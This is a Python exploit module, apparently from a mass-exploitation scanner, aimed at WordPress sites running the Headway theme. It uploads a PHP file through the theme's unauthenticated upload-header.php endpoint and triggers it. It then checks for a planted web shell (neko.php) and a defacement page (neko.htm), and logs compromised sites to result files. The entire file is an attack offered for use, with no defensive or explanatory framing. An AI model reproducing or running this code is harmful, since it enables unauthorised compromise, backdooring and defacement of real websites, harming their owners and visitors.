# coding=utf-8
import requests, re
import printModule

pagelinesExploitShell = 'files/settings_auto.php'
Headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
}



def Exploit(site):
    try:
        CheckTheme = requests.get('http://' + site, timeout=10, headers=Headers)
        if '/wp-content/themes/headway' in str(CheckTheme.content):
            ThemePath = re.findall('/wp-content/themes/(.*)/style.css', str(CheckTheme.content))
            ShellFile = {'Filedata': open(pagelinesExploitShell, 'rb')}
            url = "http://" + site + "/wp-content/themes/" + ThemePath[0] + \
                  "/library/visual-editor/lib/upload-header.php"
            Check = requests.get(url, timeout=10, headers=Headers)
            if Check.status_code == 200:
                GoT = requests.post(url, files=ShellFile, headers=Headers)
                if GoT.status_code == 200:
                    Shell_URL = 'http://' + site + '/wp-content/uploads/headway/header-uploads/' + \
                                pagelinesExploitShell.split('/')[1]
                    requests.get(Shell_URL, timeout=10, headers=Headers)
                    CheckShell = requests.get('http://' + site + '/wp-content/neko.php',
                                              timeout=10, headers=Headers)
                    CheckIndex = requests.get('http://' + site + '/neko.htm', timeout=10, headers=Headers)
                    if 'neko!!' in str(CheckShell.content):
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/wp-content/neko.php' + '\n')
                        if 'neko!!' in str(CheckIndex.content):
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(site + '/neko.htm' + '\n')
                        return printModule.returnYes(site, 'N/A', 'Headway Theme', 'Wordpress')
                    else:
                        return printModule.returnNo(site, 'N/A', 'Headway Theme', 'Wordpress')
                else:
                    return printModule.returnNo(site, 'N/A', 'Headway Theme', 'Wordpress')
            else:
                return printModule.returnNo(site, 'N/A', 'Headway Theme', 'Wordpress')
        else:
            return printModule.returnNo(site, 'N/A', 'Headway Theme', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'Headway Theme', 'Wordpress')
